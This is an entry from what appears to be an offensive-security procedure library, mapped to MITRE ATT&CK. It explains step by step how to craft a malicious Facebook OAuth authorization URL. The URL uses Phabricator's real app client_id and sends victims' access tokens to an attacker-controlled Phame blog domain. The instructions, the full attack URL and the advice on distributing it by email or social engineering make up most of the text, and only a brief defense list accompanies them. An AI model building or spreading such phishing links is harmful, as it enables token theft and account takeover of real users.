---
id: proc-2
tags:
  - oauth
  - phishing
  - redirect
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:35.294Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-Facebook-OAuth-Authorization-URL

## Summary

This procedure constructs a malicious OAuth authorization URL for Facebook using Phabricator's app credentials, directing the implicit grant flow to the attacker's custom Phame blog domain. The URL tricks victims into granting access, resulting in a redirect that exposes the access token in the URL fragment.

## Description

Facebook's OAuth implicit flow appends the access_token in a URL fragment (#access_token=...) to the specified redirect_uri. By setting this to a Phabricator Phame post on a custom attacker domain, the procedure exploits the lack of anchor stripping in Phabricator's redirect handling. Prerequisites include knowledge of Phabricator's Facebook app client_id (184510521580034) and a configured custom domain blog post. Outcomes: A distributable phishing link that initiates token theft upon victim interaction.

## Requirements

1. Phabricator's Facebook app client_id (publicly known: 184510521580034)
2. Configured malicious Phame blog post with custom domain (from prior procedure)
3. Means to distribute the URL (e.g., email, social engineering)

## Defense

Defensive measures and detection strategies:

- Enforce strict redirect_uri whitelisting in OAuth apps to match exact Phabricator domains
- Educate users on phishing links mimicking legitimate OAuth prompts
- Log and alert on OAuth authorization attempts from unusual sources

## Objectives

1. Initiate OAuth flow disguised as Phabricator integration
2. Direct redirect to attacker-controlled endpoint
3. Preserve token in fragment for capture

## Instructions

### Step 1: Identify OAuth Parameters

**Context**: Gather necessary parameters for the Facebook OAuth dialog URL.

Note the client_id=184510521580034 (Phabricator's app ID) and set response_type=token for implicit grant.

> Manual note-taking. Expected: Parameters ready for URL construction.

### Step 2: Build the Authorization URL

**Context**: Assemble the full URL pointing to the malicious redirect_uri.

Construct: https://www.facebook.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://attacker-domain.com/phame/live/47/ (replace with actual custom domain and post ID).

> URL builder or text editor. Expected: Valid, clickable OAuth link.

### Step 3: Test URL Construction

**Context**: Verify the URL triggers the Facebook dialog without errors.

Paste the URL into a browser incognito window and check for the authorization prompt.

> Browser test. Expected: Facebook dialog appears, requesting permissions.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[oauth]]
- [[Phishing]]
- [[redirect]]
